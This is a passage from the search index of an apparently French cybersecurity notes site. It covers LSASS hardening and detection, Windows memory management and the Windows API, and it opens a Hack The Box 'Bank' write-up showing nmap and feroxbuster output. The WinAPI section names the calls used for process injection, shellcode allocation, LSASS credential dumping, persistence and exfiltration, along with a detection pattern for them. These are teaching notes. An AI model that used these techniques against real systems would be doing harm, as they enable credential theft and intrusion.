acc\u00e9der aux secrets g\u00e9r\u00e9s par LSAIso.</li> <li>D\u00e9sactivation de WDigest : Assurer que la cl\u00e9 de registre <code>UseLogonCredential</code> sous <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest</code> est \u00e0 0.</li> <li>Mises \u00e0 jour r\u00e9guli\u00e8res : Pour corriger les vuln\u00e9rabilit\u00e9s potentielles dans LSASS ou les composants li\u00e9s.</li> <li>Principe du moindre privil\u00e8ge : \u00c9viter d'utiliser des comptes \u00e0 privil\u00e8ges \u00e9lev\u00e9s pour les t\u00e2ches quotidiennes.</li> </ul> </li> <li>D\u00e9tection :<ul> <li>Surveillance des acc\u00e8s au processus LSASS : Utiliser des EDR (Endpoint Detection and Response) ou des r\u00e8gles Sysmon (Event ID 10 : ProcessAccess) pour d\u00e9tecter les tentatives d'ouverture de <code>lsass.exe</code> avec des droits suspects (ex: <code>PROCESS_VM_READ</code>) par des processus inhabituels (non-syst\u00e8me, non-s\u00e9curit\u00e9).</li> <li>D\u00e9tection comportementale : Les EDR modernes ont des modules sp\u00e9cifiques pour d\u00e9tecter les techniques connues de credential dumping (patterns d'acc\u00e8s m\u00e9moire, chargement de DLL suspectes dans LSASS, appels API caract\u00e9ristiques).</li> <li>Analyse des dumps m\u00e9moire suspects : Si des dumps de LSASS sont cr\u00e9\u00e9s de mani\u00e8re inattendue.</li> <li>Surveillance des \u00e9v\u00e9nements d'audit : Activer et surveiller les \u00e9v\u00e9nements li\u00e9s \u00e0 l'authentification et \u00e0 l'utilisation des privil\u00e8ges (ex: Audit Credential Validation, Audit Kerberos Authentication Service, Audit Sensitive Privilege Use).</li> </ul> </li> </ul> <p>7. Conclusion</p> <p>LSASS est un composant fondamental et critique de la s\u00e9curit\u00e9 Windows. Sa compr\u00e9hension est essentielle pour les professionnels de la cybers\u00e9curit\u00e9. Il assure l'authentification et l'application des politiques, mais sa n\u00e9cessit\u00e9 de conserver des informations d'identification en m\u00e9moire en fait une cible privil\u00e9gi\u00e9e. Les m\u00e9canismes comme PPL et Credential Guard sont des avanc\u00e9es majeures pour sa protection, mais la vigilance via la d\u00e9tection reste indispensable.</p>"},{"location":"Ressources/Windows/RAM/","title":"RAM","text":"<p>1. Introduction</p> <p>La M\u00e9moire Vive (Random Access Memory - RAM) est une ressource mat\u00e9rielle essentielle, agissant comme un espace de stockage temporaire et rapide pour les instructions des programmes en cours d'ex\u00e9cution et les donn\u00e9es qu'ils manipulent activement. Sa gestion efficace est cruciale pour la performance et la stabilit\u00e9 du syst\u00e8me d'exploitation. Sous Windows, cette t\u00e2che complexe est orchestr\u00e9e par un composant central du noyau appel\u00e9 le Gestionnaire de M\u00e9moire (Memory Manager). Son r\u00f4le est d'allouer la m\u00e9moire aux processus, de g\u00e9rer l'espace d'adressage virtuel, d'optimiser l'utilisation de la RAM physique limit\u00e9e et de fournir des m\u00e9canismes de protection.</p> <p>2. Concepts Fondamentaux</p> <ul> <li> <p>M\u00e9moire Virtuelle (Virtual Memory) :</p> <ul> <li>Plut\u00f4t que de laisser les processus acc\u00e9der directement \u00e0 la RAM physique (ce qui serait chaotique et dangereux), Windows fournit \u00e0 chaque processus son propre espace d'adressage virtuel priv\u00e9 et isol\u00e9. Sur les syst\u00e8mes 32 bits, cet espace est typiquement de 4 Go (souvent divis\u00e9 en 2 Go pour le processus et 2 Go pour le noyau). Sur les syst\u00e8mes 64 bits, il est consid\u00e9rablement plus grand (plusieurs t\u00e9raoctets).</li> <li>Cet espace virtuel est une abstraction. Les adresses utilis\u00e9es par un processus (adresses virtuelles) ne correspondent pas directement aux adresses physiques de la RAM.</li> <li>Avantages :<ul> <li>Isolation : Un processus ne peut pas (normalement) acc\u00e9der \u00e0 la m\u00e9moire d'un autre processus, am\u00e9liorant la stabilit\u00e9 et la s\u00e9curit\u00e9.</li> <li>Contigu\u00eft\u00e9 Apparente : Le processus voit sa m\u00e9moire comme un bloc contigu, m\u00eame si elle est fragment\u00e9e en RAM physique ou partiellement stock\u00e9e sur disque.</li> <li>D\u00e9passement de la RAM Physique : Permet aux processus d'utiliser plus de m\u00e9moire que la quantit\u00e9 de RAM physiquement install\u00e9e, en utilisant le disque dur comme extension (via le fichier d'\u00e9change).</li> </ul> </li> <li>Le Gestionnaire de M\u00e9moire maintient des structures de donn\u00e9es (comme l'arbre VAD - Virtual Address Descriptor) pour suivre quelles plages d'adresses virtuelles sont utilis\u00e9es par chaque processus.</li> </ul> </li> <li> <p>M\u00e9moire Physique (Physical Memory) :</p> <ul> <li>D\u00e9signe les barrettes de RAM r\u00e9elles install\u00e9es dans l'ordinateur.</li> <li>Le Gestionnaire de M\u00e9moire la divise en blocs de taille fixe appel\u00e9s cadres de page (Page Frames), g\u00e9n\u00e9ralement de 4 Ko. Il tient \u00e0 jour une base de donn\u00e9es (la base PFN - Page Frame Number) d\u00e9crivant l'\u00e9tat de chaque cadre physique.</li> </ul> </li> <li> <p>Pagination (Paging) :</p> <ul> <li>C'est le m\u00e9canisme cl\u00e9 qui lie la m\u00e9moire virtuelle \u00e0 la m\u00e9moire physique (ou au disque). L'espace d'adressage virtuel de chaque processus est \u00e9galement divis\u00e9 en blocs de m\u00eame taille que les cadres physiques, appel\u00e9s pages virtuelles.</li> <li>Le Gestionnaire de M\u00e9moire utilise des Tables de Pages (Page Tables), sp\u00e9cifiques \u00e0 chaque processus, pour mapper chaque page virtuelle \u00e0 un cadre de page physique. Chaque entr\u00e9e dans une table de pages (Page Table Entry - PTE) contient l'adresse du cadre physique correspondant et des informations de contr\u00f4le (pr\u00e9sente en RAM ?, modifi\u00e9e ?, droits d'acc\u00e8s R/W/X ?).</li> <li>Lorsqu'un processus acc\u00e8de \u00e0 une adresse virtuelle, le mat\u00e9riel (MMU - Memory Management Unit du CPU), aid\u00e9 par le syst\u00e8me d'exploitation, consulte les tables de pages pour trouver l'adresse physique correspondante.</li> <li>Pour acc\u00e9l\u00e9rer ce processus de traduction (qui peut n\u00e9cessiter plusieurs acc\u00e8s m\u00e9moire), le CPU utilise un cache sp\u00e9cialis\u00e9 appel\u00e9 Translation Lookaside Buffer (TLB), qui stocke les traductions r\u00e9centes.</li> </ul> </li> <li> <p>Fichier d'\u00c9change / de Pagination (<code>pagefile.sys</code> - Paging File) :</p> <ul> <li>Lorsque la RAM physique est pleine et que le syst\u00e8me a besoin d'espace pour charger de nouvelles pages, le Gestionnaire de M\u00e9moire peut d\u00e9placer des pages virtuelles moins utilis\u00e9es de la RAM vers un fichier cach\u00e9 sur le disque dur : <code>pagefile.sys</code>. C'est le paging out ou swapping out.</li> <li>Si un processus tente d'acc\u00e9der \u00e0 une page qui a \u00e9t\u00e9 d\u00e9plac\u00e9e dans le fichier d'\u00e9change, cela provoque une faute de page (Page Fault). Le Gestionnaire de M\u00e9moire intercepte cette faute, trouve un cadre de page physique libre (en en lib\u00e9rant un si n\u00e9cessaire), lit la page depuis <code>pagefile.sys</code> vers ce cadre, met \u00e0 jour la table de pages, puis laisse le processus reprendre son ex\u00e9cution. C'est le paging in.</li> <li>L'utilisation intensive du fichier d'\u00e9change ralentit consid\u00e9rablement le syst\u00e8me car l'acc\u00e8s disque est beaucoup plus lent que l'acc\u00e8s RAM.</li> </ul> </li> <li> <p>\u00c9tats des Pages Physiques :</p> <ul> <li>Le Gestionnaire de M\u00e9moire maintient des listes de cadres de pages physiques selon leur \u00e9tat :<ul> <li>Active / Working Set : Pages activement utilis\u00e9es par les processus.</li> <li>Modified : Pages modifi\u00e9es en RAM mais dont la copie dans le fichier d'\u00e9change (ou le fichier d'origine pour les fichiers mapp\u00e9s) n'est plus \u00e0 jour. Elles doivent \u00eatre \u00e9crites sur disque avant que le cadre puisse \u00eatre r\u00e9utilis\u00e9.</li> <li>Standby : Pages qui \u00e9taient r\u00e9cemment dans le Working Set d'un processus mais qui n'ont pas \u00e9t\u00e9 modifi\u00e9es. Elles contiennent encore des donn\u00e9es valides et peuvent \u00eatre rapidement retourn\u00e9es au Working Set si n\u00e9cessaire (Soft Page Fault). C'est un cache. Elles sont candidates \u00e0 \u00eatre r\u00e9utilis\u00e9es si de la m\u00e9moire est n\u00e9cessaire.</li> <li>Free : Cadres de pages qui ne contiennent pas de donn\u00e9es utiles mais n'ont pas encore \u00e9t\u00e9 effac\u00e9s.</li> <li>Zeroed : Cadres de pages libres qui ont \u00e9t\u00e9 remplis de z\u00e9ros (pour des raisons de s\u00e9curit\u00e9, afin de ne pas laisser fuiter d'anciennes donn\u00e9es). Ils sont pr\u00eats \u00e0 \u00eatre allou\u00e9s imm\u00e9diatement \u00e0 un processus.</li> </ul> </li> </ul> </li> <li> <p>Jeu de Travail (Working Set) :</p> <ul> <li>Ensemble des pages physiques actuellement r\u00e9sidentes en RAM pour un processus donn\u00e9.</li> <li>Le Gestionnaire de M\u00e9moire ajuste dynamiquement la taille du Working Set de chaque processus en fonction de son activit\u00e9 et de la pression m\u00e9moire globale (demande de RAM par les autres processus).</li> <li>Trimming : Si la m\u00e9moire se fait rare, le Gestionnaire de M\u00e9moire peut r\u00e9duire le Working Set des processus moins actifs, d\u00e9pla\u00e7ant certaines de leurs pages vers les listes Modified ou Standby.</li> </ul> </li> <li> <p>Compression M\u00e9moire (Windows 10+) :</p> <ul> <li>Pour r\u00e9duire l'utilisation du fichier d'\u00e9change (lent), Windows 10 et ult\u00e9rieurs peuvent compresser les pages m\u00e9moire jug\u00e9es peu utilis\u00e9es directement en RAM.</li> <li>Ces pages compress\u00e9es sont stock\u00e9es dans une zone m\u00e9moire g\u00e9r\u00e9e par un processus syst\u00e8me appel\u00e9 \"M\u00e9moire compress\u00e9e\" (visible dans le Gestionnaire des t\u00e2ches).</li> <li>Si une page compress\u00e9e est n\u00e9cessaire, elle est d\u00e9compress\u00e9e en RAM, ce qui est beaucoup plus rapide que de la lire depuis le disque.</li> </ul> </li> <li> <p>SuperFetch/SysMain et Prefetching :</p> <ul> <li>Services (SysMain est le nom plus r\u00e9cent de SuperFetch) qui analysent les habitudes d'utilisation de l'utilisateur et tentent de pr\u00e9charger en m\u00e9moire (dans la liste Standby) les donn\u00e9es et les applications fr\u00e9quemment utilis\u00e9es avant m\u00eame qu'elles ne soient demand\u00e9es.</li> <li>Le but est d'acc\u00e9l\u00e9rer le d\u00e9marrage des applications et du syst\u00e8me. Les donn\u00e9es pr\u00e9charg\u00e9es occupent la m\u00e9moire \"Standby\", qui est imm\u00e9diatement disponible si un processus actif a besoin de plus de RAM.</li> </ul> </li> <li> <p>Pools Noyau (Kernel Pools) :</p> <ul> <li>Zones de m\u00e9moire utilis\u00e9es par le noyau Windows et les pilotes de p\u00e9riph\u00e9riques.</li> <li>Pool Non Pagin\u00e9 (Non-Paged Pool) : Contient des donn\u00e9es critiques qui doivent toujours \u00eatre pr\u00e9sentes en RAM physique et ne peuvent jamais \u00eatre d\u00e9plac\u00e9es dans le fichier d'\u00e9change (ex: structures de donn\u00e9es pour les interruptions, certains buffers de pilotes). Une fuite m\u00e9moire dans ce pool peut \u00eatre grave.</li> <li>Pool Pagin\u00e9 (Paged Pool) : Contient des donn\u00e9es du noyau moins critiques qui peuvent \u00eatre pagin\u00e9es sur disque si n\u00e9cessaire.</li> </ul> </li> </ul> <p>3. Algorithmes et M\u00e9canismes</p> <ul> <li>Remplacement de Pages (Page Replacement) : Quand une faute de page se produit et qu'il n'y a pas de cadre Zeroed ou Free disponible, le Gestionnaire de M\u00e9moire doit choisir une page \u00e0 retirer de la RAM. Il utilise un algorithme sophistiqu\u00e9, bas\u00e9 sur le principe LRU (Least Recently Used - Moins R\u00e9cemment Utilis\u00e9) mais adapt\u00e9, en privil\u00e9giant le d\u00e9placement des pages de la liste Standby vers Free/Zeroed, puis celles de la liste Modified (apr\u00e8s les avoir \u00e9crites sur disque).</li> <li>Gestion du Working Set : Le syst\u00e8me surveille les fautes de page de chaque processus. Un taux \u00e9lev\u00e9 de fautes de page peut indiquer que le processus n'a pas assez de RAM dans son Working Set, et le Gestionnaire de M\u00e9moire peut d\u00e9cider de l'augmenter (si de la m\u00e9moire est disponible). Inversement, si un processus est inactif ou si la pression m\u00e9moire est forte, son Working Set peut \u00eatre r\u00e9duit (trimmed).</li> </ul> <p>4. Surveillance de la M\u00e9moire</p> <p>Plusieurs outils permettent d'observer la gestion de la m\u00e9moire :</p> <ul> <li>Gestionnaire des T\u00e2ches (Task Manager) :<ul> <li>Onglet Performance &gt; M\u00e9moire : Donne une vue globale (Utilis\u00e9e, Disponible, Mise en Cache [Standby+Modified], Paged/Non-paged pools).</li> <li>Onglet D\u00e9tails : Affiche le Working Set (colonne \"M\u00e9moire (jeu de travail actif)\") pour chaque processus.</li> </ul> </li> <li>Moniteur de Ressources (Resource Monitor - resmon.exe) :<ul> <li>Onglet M\u00e9moire : Offre une vue tr\u00e8s d\u00e9taill\u00e9e des processus, de leur Working Set, des fautes de page (Hard Faults = acc\u00e8s au disque), et une barre graphique montrant la r\u00e9partition de la m\u00e9moire physique (Hardware Reserved, In Use, Modified, Standby, Free).</li> </ul> </li> <li>Analyseur de Performances (Performance Monitor - perfmon.exe) : Permet de suivre des compteurs de performance tr\u00e8s sp\u00e9cifiques li\u00e9s \u00e0 la m\u00e9moire sur la dur\u00e9e.</li> <li>RAMMap (Sysinternals) : Outil avanc\u00e9 qui donne une cartographie tr\u00e8s pr\u00e9cise de l'utilisation de la m\u00e9moire physique, montrant comment elle est allou\u00e9e (Process Private, Mapped File, Page Table, etc.) et l'\u00e9tat des pages (Active, Standby, Modified...).</li> </ul> <p>5. Implications pour la S\u00e9curit\u00e9</p> <p>La gestion de la m\u00e9moire est intimement li\u00e9e \u00e0 la s\u00e9curit\u00e9 :</p> <ul> <li>Forensique M\u00e9moire (Memory Forensics) : L'analyse d'un dump (copie) de la RAM d'une machine est une technique d'investigation num\u00e9rique cruciale. La RAM contient l'\u00e9tat volatile du syst\u00e8me : processus en cours, connexions r\u00e9seau ouvertes, commandes tap\u00e9es, cl\u00e9s de chiffrement, et parfois m\u00eame des identifiants (cf. Lsass.exe). Des outils comme Volatility permettent d'extraire ces informations.</li> <li>Exploitation de Vuln\u00e9rabilit\u00e9s : De nombreuses vuln\u00e9rabilit\u00e9s (d\u00e9passements de tampon, use-after-free, type confusion) exploitent la mani\u00e8re dont la m\u00e9moire est allou\u00e9e, lib\u00e9r\u00e9e et acc\u00e9d\u00e9e par les processus. Comprendre la gestion de la m\u00e9moire est essentiel pour d\u00e9velopper et comprendre ces exploits.</li> <li>M\u00e9canismes de D\u00e9fense : Windows int\u00e8gre des d\u00e9fenses au niveau de la gestion m\u00e9moire :<ul> <li>ASLR (Address Space Layout Randomization) : Rend al\u00e9atoire l'emplacement des zones m\u00e9moire cl\u00e9s (ex\u00e9cutables, DLLs, tas, pile) dans l'espace d'adressage virtuel, rendant plus difficile pour un attaquant de pr\u00e9dire les adresses \u00e0 cibler dans un exploit.</li> <li>DEP (Data Execution Prevention) / NX bit (No-Execute) : Marque les zones m\u00e9moire destin\u00e9es aux donn\u00e9es comme non ex\u00e9cutables. Si un attaquant parvient \u00e0 injecter du code dans une telle zone (ex: sur la pile via un buffer overflow) et \u00e0 y d\u00e9tourner l'ex\u00e9cution, le CPU l\u00e8vera une exception au lieu d'ex\u00e9cuter le code malveillant.</li> </ul> </li> <li>Fuites d'Information : Des donn\u00e9es sensibles peuvent rester en m\u00e9moire (m\u00eame dans les pages Standby ou dans le fichier d'\u00e9change) apr\u00e8s avoir \u00e9t\u00e9 utilis\u00e9es. La gestion des pages Zeroed vise \u00e0 mitiger ce risque pour les nouvelles allocations.</li> </ul> <p>6. Conclusion</p> <p>La gestion de la m\u00e9moire sous Windows est un syst\u00e8me dynamique et complexe, jonglant constamment entre les besoins des applications, les limitations de la RAM physique et les imp\u00e9ratifs de performance et de s\u00e9curit\u00e9. Le Gestionnaire de M\u00e9moire utilise des abstractions comme la m\u00e9moire virtuelle et des m\u00e9canismes comme la pagination, la mise en cache (Standby list), la compression et le prefetching pour optimiser l'utilisation de cette ressource critique. Comprendre ces m\u00e9canismes est fondamental pour le d\u00e9pannage de performances, le d\u00e9veloppement logiciel efficace, et bien s\u00fbr, pour l'analyse de s\u00e9curit\u00e9 et la compr\u00e9hension des techniques d'attaque et de d\u00e9fense.</p>"},{"location":"Ressources/Windows/WinAPI/","title":"WinAPI","text":""},{"location":"Ressources/Windows/WinAPI/#introduction-a-lapi-windows-winapi","title":"Introduction \u00e0 l'API Windows (WinAPI)","text":"<p>1. Qu'est-ce que l'API Windows ?</p> <p>L'API Windows (Application Programming Interface) est un ensemble de fonctions, de structures de donn\u00e9es, de messages et d'interfaces expos\u00e9es par le syst\u00e8me d'exploitation Microsoft Windows. Son but principal est de permettre aux applications d\u00e9velopp\u00e9es par Microsoft ou des tiers d'interagir avec le syst\u00e8me d'exploitation et ses ressources de mani\u00e8re contr\u00f4l\u00e9e et standardis\u00e9e.</p> <p>En substance, c'est la couche d'abstraction logicielle qui se situe entre les applications (qui s'ex\u00e9cutent g\u00e9n\u00e9ralement en mode utilisateur) et les composants internes du syst\u00e8me d'exploitation (dont une grande partie s'ex\u00e9cute en mode noyau). Quand une application veut cr\u00e9er un fichier, afficher une fen\u00eatre, allouer de la m\u00e9moire ou, comme dans notre exemple pr\u00e9c\u00e9dent (<code>lsass_c_interaction_code</code>), interagir avec un autre processus, elle utilise les fonctions fournies par l'API Windows.</p> <p>Elle est principalement con\u00e7ue autour du langage C, mais elle est accessible depuis de nombreux autres langages de programmation (C++, C#, Python, Delphi, etc.) via des m\u00e9canismes sp\u00e9cifiques (wrappers, P/Invoke, ctypes...).</p> <p>2. Structure et Composants Cl\u00e9s</p> <p>L'API n'est pas monolithique. Elle est organis\u00e9e en plusieurs biblioth\u00e8ques de liens dynamiques (DLLs) qui regroupent les fonctions par domaine. Les plus fondamentales sont :</p> <ul> <li><code>kernel32.dll</code>: Fournit les fonctions de base du syst\u00e8me d'exploitation.<ul> <li>Gestion de la m\u00e9moire (ex: <code>VirtualAlloc</code>, <code>HeapAlloc</code>)</li> <li>Gestion des processus et des threads (ex: <code>CreateProcess</code>, <code>OpenProcess</code>, <code>TerminateProcess</code>, <code>CreateToolhelp32Snapshot</code>)</li> <li>Gestion des fichiers et des entr\u00e9es/sorties (E/S) (ex: <code>CreateFile</code>, <code>ReadFile</code>, <code>WriteFile</code>)</li> <li>Synchronisation (ex: <code>CreateMutex</code>, <code>WaitForSingleObject</code>)</li> <li>Exemples du code pr\u00e9c\u00e9dent : <code>CreateToolhelp32Snapshot</code>, <code>Process32First</code>, <code>Process32Next</code>, <code>OpenProcess</code>, <code>CloseHandle</code>, <code>GetLastError</code>.</li> </ul> </li> <li><code>advapi32.dll</code> (Advanced API): Contient des fonctions li\u00e9es \u00e0 la s\u00e9curit\u00e9 et au registre.<ul> <li>Gestion du Registre Windows (ex: <code>RegOpenKeyEx</code>, <code>RegQueryValueEx</code>)</li> <li>S\u00e9curit\u00e9 : Contr\u00f4le d'acc\u00e8s, privil\u00e8ges, audit, chiffrement (ex: <code>OpenProcessToken</code>, <code>LookupPrivilegeValue</code>, <code>AdjustTokenPrivileges</code>, fonctions LSA, CryptoAPI)</li> <li>Gestion des services Windows (ex: <code>OpenSCManager</code>, <code>CreateService</code>)</li> <li>Exemples du code pr\u00e9c\u00e9dent : <code>OpenProcessToken</code>, <code>LookupPrivilegeValue</code>, <code>AdjustTokenPrivileges</code>.</li> </ul> </li> <li><code>user32.dll</code>: G\u00e8re tout ce qui concerne l'interface utilisateur graphique (GUI).<ul> <li>Cr\u00e9ation et gestion des fen\u00eatres (ex: <code>CreateWindowEx</code>, <code>DefWindowProc</code>)</li> <li>Traitement des messages Windows (ex: <code>GetMessage</code>, <code>DispatchMessage</code>)</li> <li>Gestion des contr\u00f4les (boutons, bo\u00eetes de dialogue...)</li> </ul> </li> <li><code>gdi32.dll</code> (Graphics Device Interface): Responsable du dessin, de l'affichage graphique, des polices de caract\u00e8res.</li> <li><code>ntdll.dll</code> (NT Layer DLL): C'est une DLL de plus bas niveau, qui sert d'interface principale entre les DLLs du mode utilisateur (comme <code>kernel32</code>, <code>advapi32</code>) et les appels syst\u00e8me r\u00e9els vers le mode noyau. Une partie de <code>ntdll.dll</code> constitue l'API Native. Elle est moins document\u00e9e officiellement par Microsoft et son utilisation directe est plus complexe, mais elle est souvent utilis\u00e9e par des outils syst\u00e8me avanc\u00e9s, des logiciels de s\u00e9curit\u00e9, et malheureusement aussi par des malwares pour tenter de contourner les d\u00e9tections bas\u00e9es sur les API de plus haut niveau.</li> </ul> <p>Concepts importants :</p> <ul> <li>Fonctions API : Les routines sp\u00e9cifiques que l'on appelle (ex: <code>OpenProcess</code>). Elles suivent souvent des conventions de nommage (ex: <code>VerbeNom</code>). Beaucoup existent en deux versions : <code>A</code> (ANSI, pour les anciennes cha\u00eenes de caract\u00e8res) et <code>W</code> (Wide/Unicode, la version moderne et recommand\u00e9e).</li> <li>Handles : Des valeurs opaques (souvent des pointeurs ou des index) retourn\u00e9es par de nombreuses fonctions API pour repr\u00e9senter un objet g\u00e9r\u00e9 par le noyau (fichier, processus, thread, jeton d'acc\u00e8s, cl\u00e9 de registre...). Ces handles doivent \u00eatre g\u00e9r\u00e9s correctement et ferm\u00e9s (<code>CloseHandle</code>, <code>RegCloseKey</code>, etc.) lorsque l'on n'en a plus besoin pour \u00e9viter les fuites de ressources. Exemples du code pr\u00e9c\u00e9dent : <code>hToken</code>, <code>hProcessSnap</code>, <code>hLsassProcess</code>.</li> <li>Messages : Pour les applications graphiques, un m\u00e9canisme central bas\u00e9 sur des messages envoy\u00e9s aux fen\u00eatres pour notifier des \u00e9v\u00e9nements (clic de souris, touche clavier, redimensionnement...).</li> </ul> <p>3. Comment l'utiliser ?</p> <p>En C/C++, on inclut l'en-t\u00eate principal <code>windows.h</code> (ou des en-t\u00eates plus sp\u00e9cifiques) et on lie le programme avec les biblioth\u00e8ques d'importation (<code>.lib</code>) correspondantes (ex: <code>kernel32.lib</code>, <code>advapi32.lib</code>). Dans d'autres langages, on utilise les m\u00e9canismes d'interop\u00e9rabilit\u00e9 fournis par le langage (ex: <code>DllImport</code> en C#, <code>ctypes</code> en Python).</p> <p>4. Domaines Fonctionnels Cl\u00e9s (pertinents pour la cybers\u00e9curit\u00e9)</p> <p>L'API Windows couvre \u00e9norm\u00e9ment de domaines, mais voici ceux qui sont particuli\u00e8rement pertinents en cybers\u00e9curit\u00e9 :</p> <ul> <li>Gestion des Processus et Threads : Essentiel pour l'analyse de comportement (quels processus sont lanc\u00e9s ?), l'injection de code, la manipulation de processus (<code>CreateProcess</code>, <code>OpenProcess</code>, <code>ReadProcessMemory</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code>).</li> <li>Gestion de la M\u00e9moire : Allocation de m\u00e9moire pour du shellcode, lecture/\u00e9criture dans d'autres processus (<code>VirtualAllocEx</code>, <code>ReadProcessMemory</code>, <code>WriteProcessMemory</code>).</li> <li>S\u00e9curit\u00e9 : Manipulation des jetons d'acc\u00e8s (<code>OpenProcessToken</code>, <code>DuplicateTokenEx</code>), gestion des privil\u00e8ges (<code>AdjustTokenPrivileges</code>), interaction avec LSA (<code>LsaEnumerateLogonSessions</code>), chiffrement/d\u00e9chiffrement (CryptoAPI, DPAPI), gestion des ACLs.</li> <li>Acc\u00e8s aux Fichiers et R\u00e9pertoires : Lecture/\u00e9criture/suppression de fichiers, surveillance de r\u00e9pertoires (<code>CreateFile</code>, <code>ReadFile</code>, <code>WriteFile</code>, <code>FindFirstFile</code>, <code>ReadDirectoryChangesW</code>).</li> <li>Registre : Lecture/\u00e9criture de cl\u00e9s pour la configuration, mais surtout pour les techniques de persistance (<code>RegCreateKeyEx</code>, <code>RegSetValueEx</code>).</li> <li>R\u00e9seau (Winsock, WinHTTP, WinINet) : Communication r\u00e9seau, t\u00e9l\u00e9chargement de charges utiles, exfiltration de donn\u00e9es (<code>socket</code>, <code>connect</code>, <code>send</code>, <code>recv</code>, <code>HttpOpenRequest</code>).</li> <li>Services Windows : Cr\u00e9ation/modification de services pour la persistance (<code>CreateService</code>, <code>ChangeServiceConfig</code>).</li> </ul> <p>5. Importance en Cybers\u00e9curit\u00e9</p> <ul> <li>Blue Team : Comprendre les appels API est fondamental pour :<ul> <li>Analyser le comportement des malwares (statique et dynamique).</li> <li>D\u00e9velopper des r\u00e8gles de d\u00e9tection (ex: Sysmon, EDR) bas\u00e9es sur des s\u00e9quences suspectes d'appels API (ex: <code>OpenProcess</code> sur <code>lsass.exe</code> suivi de <code>ReadProcessMemory</code>).</li> <li>Comprendre comment les outils de s\u00e9curit\u00e9 interagissent avec le syst\u00e8me (hooking d'API, etc.).</li> <li>R\u00e9aliser des investigations num\u00e9riques (forensics).</li> </ul> </li> <li>Red Team / D\u00e9veloppement de Malware : La connaissance de l'API Windows est indispensable pour :<ul> <li>D\u00e9velopper des outils personnalis\u00e9s (exploits, implants, C2).</li> <li>Mettre en \u0153uvre des techniques d'attaque (injection, \u00e9vasion, persistance, mouvement lat\u00e9ral).</li> <li>Interagir avec le syst\u00e8me \u00e0 bas niveau, parfois en utilisant des fonctions non document\u00e9es (<code>ntdll.dll</code>) pour \u00e9chapper \u00e0 la d\u00e9tection.</li> </ul> </li> </ul> <p>Conclusion</p> <p>L'API Windows est vaste et complexe, mais elle constitue la pierre angulaire de toute interaction programmatique avec le syst\u00e8me d'exploitation Windows. En comprendre les principes de base, les composants majeurs et les domaines fonctionnels cl\u00e9s est essentiel pour quiconque travaille dans le d\u00e9veloppement logiciel ou la cybers\u00e9curit\u00e9 sous Windows. L'exemple de code pr\u00e9c\u00e9dent n'\u00e9tait qu'un minuscule aper\u00e7u de ce qu'elle permet de faire.</p>"},{"location":"Writeup/HTB/Machines/Bank/","title":"Bank","text":"Room Bank Url https://app.hackthebox.com/machines/Bank Sujets Linux Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Easy"},{"location":"Writeup/HTB/Machines/Bank/#nmap","title":"Nmap","text":"<pre><code>PORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n ssh-hostkey: \n   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)\n ssh-dss AAAAB3NzaC1kc3MAAACBAMJ+YATka9wvs0FTz8iNWs6uCiLqSFhmBYoYAorFpozVGkCkU1aEJ7biybFTw/qzS9pbSsaYA+3LyUyvh3BSPGEt1BgGW/H29MuXjkznwVz60JqL4GqaJzYSL3smYYdr3KdJQI/QSvf34WU3pife6LRmJaVk+ETh3wPclyecNtedAAAAFQC1Zb2O2LzvAWf20FdsK8HRPlrx1wAAAIBIBAhLmVd3Tz+o+6Oz39g4Um1le8d3DETINWk3myRvPw8hcnRwAFe1+14h3RX4fr+LKXoR/tYrI138PJyiyl+YtQWhZnJ7j8lqnKRU2YibtnUc44kP9FhUqeAcBNjj4qwG9GyQSWm/Q5CbOokgaa6WfdcnwsUMim0h2Ad8YdU1kAAAAIBy3dOOD8jKHeBdE/oXGG0X9tKSFZv1gPr/kZ7NfqUF0kHU3oZTNK8/2qR0SNHgrZ2cLgKTIuneGS8lauXjC66NNMoUkJcMHpwRkYC0A86LDmhES6OuPsQwAjr1AtUZn97QjYu1d6WPfhTdsRYBuCotgKh2SBkzV1Bcz77Tnp56JA==\n   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc0rofjHtpSlqkDjjnkEiYcbUrMH0Q4a6PcxqsR3updDGBWu/RK7AGWRSjPn13uil/nl44XF/fkULy7FoXXskByLCHP8FS2gYJApQMvI9n81ERojEA0NIi6VZKP19bl1VFTk7Q5rEPIpab2xqYMBayb1ch7iP95n3iayvHEt/7cSTsddGWKeALi+rrujpnryNViiOIWpqDv+RWtbc2Wuc/FTeGSOt1LBTbtKcLwEehBG+Ym8o8iKTd+zfVudu7v1g3W2Aa3zLuTcePRKLUK3Q2D7k+5aJnWrekpiARQm3NmMkv1NuDLeW3amVBCv6DRJPBqEgSeGMGsnqkR8CKHO9/\n   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)\n ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH30xnPq1XEub/UFQ2KoHXh9LFKMNMkt60xYF3OrEp1Y5XQd0QyeLXwm6tIqWtb0rWda/ivDgmiB4GzCIMf/HQ=\n   256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)\n_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8MYjFyo+4OwYGTzeuyNd998y6cOx56mIuciim1cvKh\n53/tcp open  domain  syn-ack ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)\n dns-nsid: \n_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu\n80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))\n_http-title: Apache2 Ubuntu Default Page: It works\n_http-server-header: Apache/2.4.7 (Ubuntu)\n http-methods: \n Supported Methods: GET HEAD POST OPTIONS\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"Writeup/HTB/Machines/Bank/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>pak@laptop:~/T\u00e9l\u00e9chargements$ feroxbuster -u http://10.129.29.200\n\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 